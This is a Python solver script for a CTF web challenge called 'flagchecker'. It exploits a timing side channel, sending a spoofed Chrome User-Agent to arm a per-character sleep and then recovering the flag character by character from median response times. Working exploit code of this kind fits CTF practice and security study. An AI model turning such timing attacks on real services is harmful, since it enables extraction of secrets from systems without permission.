#!/usr/bin/env python3
"""Timing side-channel solver for web/flagchecker (CSAW 2026 Quals).

Vulnerability
-------------
`/check` compares the submitted flag to the real flag with `inputval.Flag.__eq__`,
which sleeps ~10 ms per matching LEADING character — but ONLY when the request's
User-Agent encodes a Chrome version whose build*patch == 1,000,000. The UA
"Chrome/100.0.1000.1000" gives build=1000, patch=1000 -> 1,000,000, arming the
timing oracle (see bot_check() storing _store.build / _store.patch, and the UA
gate the challenge ships).

Because the sleep is proportional to the length of the correct prefix, we recover
the flag one character at a time: for each position, submit <known_prefix>+<c> for
every candidate c and keep the one with the largest median response time. The flag
is extracted purely from timing; nothing reads it from the server's env/metadata.

Run
---
    python3 solve_flagchecker.py http://HOST:PORT/check
(usage note: run the service single-worker for clean timing, e.g.
 gunicorn -w 1 ...; see run_in_vm.sh alongside this file.)
"""
import random
import statistics
import sys
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/100.0.1000.1000 Safari/537.36")
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_{}@!?.-"
SAMPLES = 9
KNOWN_PREFIX = "csaw{"


def timed_post(url, flag):
    import time
    data = ("flag=" + urllib.parse.quote(flag)).encode()
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"User-Agent": UA,
                                          "Content-Type": "application/x-www-form-urlencoded"})
    t0 = time.perf_counter()
    try:
        urllib.request.urlopen(req, timeout=30).read()
    except Exception:
        pass
    return time.perf_counter() - t0


def median_time(url, flag):
    return statistics.median(timed_post(url, flag) for _ in range(SAMPLES))


def solve(url):
    import urllib.parse  # noqa: F401  (used in timed_post)
    for _ in range(3):
        timed_post(url, "x")  # warm up
    known = KNOWN_PREFIX
    print("[*] start %r  (%d samples/char)" % (known, SAMPLES), flush=True)
    while not known.endswith("}") and len(known) < 80:
        timings = {c: median_time(url, known + c)
                   for c in random.sample(CHARSET, len(CHARSET))}
        best = max(timings, key=timings.__getitem__)
        top = sorted(timings.items(), key=lambda x: x[1], reverse=True)[:3]
        print("[+] pos %2d: %r   top3: %s" % (
            len(known), best,
            "  ".join("%r %.1fms" % (c, t * 1000) for c, t in top)), flush=True)
        known += best
    print("\n[*] FLAG: %s" % known, flush=True)
    return known


if __name__ == "__main__":
    import urllib.parse
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000/check"
    solve(url)
